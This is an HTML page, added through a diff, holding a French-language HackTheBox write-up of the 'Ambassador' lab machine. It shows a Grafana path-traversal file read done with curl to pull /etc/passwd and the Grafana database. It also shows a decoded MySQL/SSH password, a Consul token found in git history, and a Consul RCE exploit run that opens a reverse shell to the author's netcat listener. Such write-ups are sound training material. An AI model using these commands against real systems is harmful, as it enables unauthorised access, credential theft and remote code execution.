@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:conflict]">
+<meta name="description" content="Medium / Linux" />
+<meta name="keywords" content="cybersecurity blog french hacking rami malek, linux, CVE, grafana, mysql, linpeas, consul" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/htb/ambassador/" />
+
+
+    <title>
+        
+            📙 HackTheBox - Ambassador :: conflict  — cybersecurity blog
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.244183cde1a38e0b08f82c11791181288f9aac1cc9618cd6f4e9e7710c5768ba.css" integrity="sha256-JEGDzeGjjgsI&#43;CwReRGBKI&#43;arBzJYYzW9OnncQxXaLo=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="📙 HackTheBox - Ambassador">
+  <meta itemprop="description" content="Medium / Linux">
+  <meta itemprop="datePublished" content="2023-01-04T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2023-01-04T00:00:00+00:00">
+  <meta itemprop="wordCount" content="770">
+  <meta itemprop="image" content="/">
+  <meta itemprop="keywords" content="Linux,Cve,Grafana,Mysql,Linpeas,Consul">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="/">
+  <meta name="twitter:title" content="📙 HackTheBox - Ambassador">
+  <meta name="twitter:description" content="Medium / Linux">
+
+
+
+    <meta property="og:url" content="/htb/ambassador/">
+  <meta property="og:site_name" content="conflict">
+  <meta property="og:title" content="📙 HackTheBox - Ambassador">
+  <meta property="og:description" content="Medium / Linux">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="htb&#39;">
+    <meta property="article:published_time" content="2023-01-04T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-01-04T00:00:00+00:00">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Cve">
+    <meta property="article:tag" content="Grafana">
+    <meta property="article:tag" content="Mysql">
+    <meta property="article:tag" content="Linpeas">
+    <meta property="article:tag" content="Consul">
+    <meta property="og:image" content="/">
+      <meta property="og:see_also" content="/htb/broscience/">
+      <meta property="og:see_also" content="/htb/photobomb/">
+      <meta property="og:see_also" content="/htb/updown/">
+      <meta property="og:see_also" content="/htb/shoppy/">
+
+
+
+
+
+
+    <meta property="article:published_time" content="2023-01-04 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">-</span>
+            <span class="logo__text ">
+                cnf409</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#527ea9;
+                   animation-duration:0.8s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/contact/">Contact</a></li><li><a href="/htb/">HackTheBox</a></li><li><a href="/posts/">Posts</a></li><li><a href="/series/">Series</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="/htb/ambassador/">📙 HackTheBox - Ambassador</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h3 id="table-of-contents">Table of contents</h3>
+<hr>
+<ul>
+<li>
+<p><a href="/htb/ambassador/#recon">Recon</a></p>
+</li>
+<li>
+<p><a href="/htb/ambassador/#foothold">Foothold</a></p>
+</li>
+<li>
+<p><a href="/htb/ambassador/#privilege-escalation">Privilege Escalation</a></p>
+</li>
+</ul>
+<hr>
+<h1 id="note">Note</h1>
+<p>La room était assez sympa, plutôt entre medium et easy. C&rsquo;est dommage qu&rsquo;il n&rsquo;y ait &ldquo;que&rdquo; des CVE même si l&rsquo;exploitation de Consul est intéressante.</p>
+<h1 id="recon">Recon</h1>
+<pre tabindex="0"><code>dirb http://10.10.11.183
+</code></pre><p><img alt="dirb results" src="https://i.ibb.co/rtQ943K/2022-12-05-151758-960x1078-scrot.png"></p>
+<pre tabindex="0"><code>nmap -sC -sV 10.10.11.183
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">3000</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">ppp</span><span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">fingerprint</span><span style="color:#f92672">-</span><span style="color:#a6e22e">strings</span><span style="color:#f92672">:</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#a6e22e">FourOhFourRequest</span><span style="color:#f92672">:</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>     <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span> <span style="color:#ae81ff">302</span> <span style="color:#a6e22e">Found</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>     <span style="color:#a6e22e">Cache</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">no</span><span style="color:#f92672">-</span><span style="color:#a6e22e">cache</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>     <span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">html</span>; <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#a6e22e">utf</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>     <span style="color:#a6e22e">Expires</span><span style="color:#f92672">:</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>     <span style="color:#a6e22e">Location</span><span style="color:#f92672">:</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">login</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>     <span style="color:#a6e22e">Pragma</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">no</span><span style="color:#f92672">-</span><span style="color:#a6e22e">cache</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3306</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">nagios</span><span style="color:#f92672">-</span><span style="color:#a6e22e">nsca</span> <span style="color:#a6e22e">Nagios</span> <span style="color:#a6e22e">NSCA</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">mysql</span><span style="color:#f92672">-</span><span style="color:#a6e22e">info</span><span style="color:#f92672">:</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#a6e22e">Protocol</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#a6e22e">Version</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">8.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">30</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">ubuntu0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">20.04</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#a6e22e">Thread</span> <span style="color:#a6e22e">ID</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">48</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#a6e22e">Capabilities</span> <span style="color:#a6e22e">flags</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">65535</span>
+</span></span></code></pre></div><p>Rien de vraiment utile au niveau du dirb, le nmap lui en revanche montre deux choses intéressantes:</p>
+<ul>
+<li><code>mysql</code> sur le port <code>3306</code></li>
+<li>On a un service non reconnu sur le port <code>3000</code></li>
+</ul>
+<p>On se rend sur le port <code>3000</code> et on est redirigés vers un <code>/login</code></p>
+<p>Le service non reconnu sur le port 3000 est donc Grafana</p>
+<p><img alt="2022-12-05-145048_1870x971_scrot.png" src="https://i.ibb.co/bsdYbp8/2022-12-05-145048-1870x971-scrot.png"></p>
+<h1 id="foothold">Foothold</h1>
+<p>En bas de la page, on voit que la version de Grafana est <code>8.2.0</code>, or il existe un exploit valable pour toutes les versions <code>&lt;8.3.0</code></p>
+<p>→ <a href="https://www.exploit-db.com/exploits/50581">https://www.exploit-db.com/exploits/50581</a></p>
+<p>Il s’agit d’un Arbitrary File Read, on devrait donc pouvoir lire plus ou moins tout les fichiers du serveur (tant que l’user Grafana a la permission de le faire)</p>
+<p>On peut vérifier que le script fonctionne en lisant le <code>/etc/passwd</code></p>
+<p><img alt="2022-12-05-145457_943x1048_scrot.png" src="https://i.ibb.co/SQ92gwv/2022-12-05-145457-943x1048-scrot.png"></p>
+<p>L’exploit marche bel et bien, et en lisant le code on peut voir qu&rsquo;il éxecute cette commande bash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../<span style="color:#f92672">{</span>input<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>On peut récupérer la database du grafana (dans laquelle devrait se trouver le mot de passe de l’utilisateur mysql)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
+</span></span></code></pre></div><blockquote>
+<p>Le <code>-o</code> permet de sauvegarder l&rsquo;output de notre <code>curl</code> dans un fichier, en l&rsquo;occurence ici, on la sauvegarde dans <code>grafana.db</code></p>
+</blockquote>
+<p>Puis qu&rsquo;on ne peut pas lire un fichier <code>sqlite</code> en l&rsquo;ouvrant dans un éditeur de texte, on peut l’upload sur <a href="https://sqliteviewer.app">https://sqliteviewer.app</a>.</p>
+<p>On trouve assez rapidement un mot de passe dans la table <code>data_source</code></p>
+<p><img alt="password.png" src="https://i.ibb.co/nfCtZyG/2022-12-05-145940-1143x618-scrot.png"></p>
+<p>On se connecte à la database mysql avec comme user “grafana” et le mot de passe qu&rsquo;on vient de trouver</p>
+<pre tabindex="0"><code>mysql -u grafana -p -h ambassador.htb
+</code></pre><p>En listant les databases, une sort du lot: <code>whackywidget</code></p>
+<p><img alt="2022-12-05-150214_964x1048_scrot.png" src="https://i.ibb.co/jwjtzch/2022-12-05-150214-964x1048-scrot.png"></p>
+<p>On peut donc switcher dessus et lister les tables qu&rsquo;elle contient via la commande <code>show TABLES;</code></p>
+<p>Il n’y en a qu’une seule: <code>users</code>. En lisant son contenu, on voit un mot de passe encodé en <code>base64</code></p>
+<p><img alt="2022-12-05-150330_961x546_scrot.png" src="https://i.ibb.co/X55ysHw/2022-12-05-150330-961x546-scrot.png"></p>
+<p>On peut retrouver sa valeur en clair via cette commande</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&#34;</span> | base64 -d
+</span></span></code></pre></div><p>Pour cette étape, il faut se souvenir d&rsquo;une information présente sur la page principale du site:</p>
+<blockquote>
+<p>Connecting to this machine Use the developer account to SSH</p>
+</blockquote>
+<p>On peut donc deviner que l&rsquo;utilisateur qui correspond à ce mot de passe est <code>developer</code></p>
+<p><img alt="2022-12-05-150853_966x1056_scrot.png" src="https://i.ibb.co/TrvwZ01/2022-12-05-150853-966x1056-scrot.png"></p>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>On peut commencer par run <code>linpeas</code> pour essayer de trouver des vecteurs de privesc</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╔══════════╣</span> Interesting GROUP writable files (<span style="color:#f92672">not</span> <span style="color:#f92672">in</span> Home) (max <span style="color:#ae81ff">500</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╚</span> [https:<span style="color:#f92672">//</span>book<span style="color:#f92672">.</span>hacktricks<span style="color:#f92672">.</span>xyz<span style="color:#f92672">/</span>linux<span style="color:#f92672">-</span>hardening<span style="color:#f92672">/</span>privilege<span style="color:#f92672">-</span>escalation<span style="color:#75715e">#writable-files](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files)</span>
+</span></span><span style="display:flex;"><span>Group developer:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>consul<span style="color:#f92672">.</span>d<span style="color:#f92672">/</span>config<span style="color:#f92672">.</span>d
+</span></span></code></pre></div><p>On peut voir que <code>consul</code> est présent sur cette machine, mais qu&rsquo;est ce que <code>consul</code>?</p>
+<p>→ <a href="https://developer.hashicorp.com/consul/docs/intro">https://developer.hashicorp.com/consul/docs/intro</a></p>
+<p><code>Consul</code> permet entre autres d&rsquo;enregistrer des <strong>tâches</strong> en tant que <code>root</code> (qui seront donc effectuées avec les permissions <code>sudo</code>)</p>
+<p>On peut déjà comprendre assez vite comment va fonctionner la privesc.</p>
+<p>On trouve <a href="https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API/blob/main/exploit.py">cet exploit</a> qui devrait pouvoir fonctionner dans notre situation</p>
+<p>Le problème, c’est qu’il demande un <code>token consul</code> qui permet d&rsquo;enregistrer de nouvelles tasks.</p>
+<p>N&rsquo;ayant pas ce token, je me suis replongé dans l&rsquo;output de <code>linpeas</code> pensant que <code>consul</code> n&rsquo;était pas la solution pour cette privesc.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╔══════════╣</span> Analyzing Github Files (limit <span style="color:#ae81ff">70</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> rw<span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span>r<span style="color:#f92672">--</span> <span style="color:#ae81ff">1</span> developer developer <span style="color:#ae81ff">93</span> Sep <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">02</span>:<span style="color:#ae81ff">28</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>developer<span style="color:#f92672">/.</span>gitconfig
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>drwxrwxr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">8</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2022</span> <span style="color:#f92672">/</span>opt<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>app<span style="color:#f92672">/.</span>git
+</span></span></code></pre></div><p>On voit qu&rsquo;il existe un répertoire <code>.git</code> dans <code>/opt/my-app</code></p>
+<p>On peut donc s&rsquo;y rendre puis faire un <code>git log</code> pour accéder à l&rsquo;historique des commits faits au repo. On affiche ensuite les changements faits au commit original</p>
+<pre tabindex="0"><code>git show 33a53ef9a207976d5ceceddc41a199558843bf3c
+</code></pre><p>Et on y trouve le <code>token consul</code> écrit en clair.</p>
+<p><img alt="bb03b43b-1d81-d62b-24b5-39540ee469b5" src="https://i.ibb.co/z4Vv44N/2022-12-05-151635-965x1055-scrot.png"></p>
+<p>On reprend donc <a href="https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API/blob/main/exploit.py">l&rsquo;exploit</a> de tout à l&rsquo;heure, que devrait fonctionner maintenant qu&rsquo;on a le <code>token consul</code></p>
+<blockquote>
+<p>Il est aussi possible de passer par metasploit puisqu&rsquo;il existe un exploit pour cette CVE, mais puisque <code>consul</code> est un service local (il n&rsquo;est accessible que localement) il faudrait forwarder le port avec <code>chisel</code>. C&rsquo;est faisable sur cette machine, mais j&rsquo;ai décidé ici de directement mettre l&rsquo;exploit sur la machine.</p>
+</blockquote>
+<p>On lance notre listener <code>netcat</code>, puis on lance l&rsquo;exploit sur la machine via cette commande</p>
+<pre tabindex="0"><code>python3 exploit.py 127.0.0.1 8500 10.10.14.53 1338 bb03b43b-1d81-d62b-24b5-39540ee469b5
+</code></pre><blockquote>
+<p>8500 = Port sur lequel se trouve le service <code>consul</code></p>
+<p>1338 = Port sur lequel écoute notre <code>netcat</code></p>
+<p>10.10.14.53 = L&rsquo;IP de notre <code>OpenVPN</code> (ou de votre machine)</p>
+</blockquote>
+<p>On attend quelques secondes puis on reçoit la connection via le <code>netcat</code></p>
+<p><img alt="2022-12-05-152521_1916x1080_scrot.png" src="https://i.ibb.co/zb4CsX6/2022-12-05-152521-1916x1080-scrot.png"></p>
+<h6 id="back-to-top"><a href="/"><em>back to top</em></a></h6>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="/tags/linux/">linux</a></span>
+        <span class="tag"><a href="/tags/cve/">CVE</a></span>
+        <span class="tag"><a href="/tags/grafana/">grafana</a></span>
+        <span class="tag"><a href="/tags/mysql/">mysql</a></span>
+        <span class="tag"><a href="/tags/linpeas/">linpeas</a></span>
+        <span class="tag"><a href="/tags/consul/">consul</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="/">conflict</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>framework: <a href="http://gohugo.io">Hugo</a></span><span>in rami malek we trust</span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>
+
+
+
+
+    </body>
+</html>
